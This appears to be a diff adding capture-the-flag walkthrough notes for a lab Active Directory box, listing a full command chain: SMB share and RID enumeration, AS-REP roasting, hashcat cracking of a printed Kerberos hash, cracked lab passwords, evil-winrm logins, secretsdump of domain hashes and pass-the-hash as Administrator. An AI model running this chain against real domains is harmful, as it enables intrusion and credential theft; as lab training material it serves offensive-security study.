@@ -1,0 +1,65 @@
+ip : 10.10.80.177
+domain : vulnnet-rst.local
+
+- nmap result revelas that the box is an active directory box with all the regular ports open like 53, 88, 139, 445 etc
+- adding the domain name from the nmap result to the /etc/hosts file 
+- enumerating the smb shares with smbclient 
+	
+	smbclient -L ////10.10.80.177
+
+- enumerating the smb shares with crackmapexec
+	
+	crackmapexec smb 10.10.80.177 -u 'guest' -p '' --shares
+
+- we can see that there are 3 shares which are readable to us
+- one of which is IPC$ 
+- enumerating for users with crackmapexec since the IPC$ share is readable to us 
+	
+	crackmapexec smb 10.10.80.177 -u 'guest' -p '' --rid-brute 
+
+- we got a bunch of usernames
+- using cut on them to get the username list
+- since we have a valid userlist we can try asrep-roasting 
+
+	GetNPusers vulnnet-rst.local/ -usersfile user.list -dc-ip 10.10.80.177
+
+- the user t-skid kerberos preauthentication is not rnabled
+- we get the hash of the t-skid user 
+
+$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:1b59d97b36ccdb05e7612011d6f78175$665fcca6836ee7474c77f47bb13cce00a8b4f72755558359de9c33d761e197bca1d050726f242b4bfd40bb381df95a93e9ce38b7c1205ad6a6bfcde405914ba1b3f3fdb45270eb947eb6b3053ae4f2976724b821531543728942973c3fd22af492601a11744d1d2a9a2d1ef75b0cf913d67736f0b87bba27e0a253ecfd17f53bfb784d33622bc560879b8fdf7d0d8573298e5b3f600bacc841fe17f7188de903919515be1811f6012a5795a73be7a319c9c4bf2ee9ceef48cd19ebf8dadaa90d530e9ff6eca96ae5fe5e08dee06f9281f9b70b3067799adf8535a75e9b73e06238012abe1cb67e24bcf906a560c248f6bef552349e1d
+
+- cracking the hash with hashcat
+
+	hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+	
+	creds : t-skid : tj072889*
+	
+- tried kerbroasting but didnt work
+- trying the credentials we have with the smbclient
+
+	smbclient //10.10.80.177/NETLOGON -U t-skid --password tj072889*
+	
+- we get a resetpassword file , download it and inspect it to get credentials	
+	
+creds : a-whitehat : bNdKVkjv3RR9ht
+
+- now that we have the credentials of a valid user we can use evil winrm to get on the box
+
+evil-winrm -i 10.10.80.177 -u a-whitehat -p "bNdKVkjv3RR9ht"
+
+- grab the user flag 
+- checking the new credentials with the smb shares 
+
+crackmapexec smb 10.10.80.177 -u 'a-whitehat' -p 'bNdKVkjv3RR9ht' --shares
+
+- we have read/write access on several shares including ADMIN$ and C$
+- we use secretsdump tool to dump all the hashes in the domain
+ 
+secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.80.177
+
+- we get the administrator hash and we can evil-winrm into the machine with the hash
+
+evil-winrm -i 10.10.80.177 -u Administrator -H "c2597747aa5e43022a3a3049a3c3b09d"
+
+- grab the root flag
+
